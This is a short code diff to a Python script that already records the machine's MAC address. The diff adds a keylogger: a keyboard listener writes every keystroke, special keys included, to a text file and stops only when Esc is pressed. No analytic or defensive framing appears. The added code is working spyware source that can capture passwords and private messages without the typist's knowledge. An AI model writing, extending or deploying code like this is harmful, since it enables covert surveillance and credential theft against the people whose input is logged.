@@ -71,4 +71,20 @@ def macaddr():
             file.write('\n') 
 macaddr()
 
+def on_press(key):
+    with open(textname, 'a') as file:
+        try:
+            file.write(f"{key.char} ")
+        except AttributeError:
+            file.write(f"[{key.name}] ")
 
+        file.flush()
+
+        if key == keyboard.Key.esc:
+            file.write("\n[Keylogger stopped]\n")
+            file.close()
+            return False  # This stops the listener
+
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
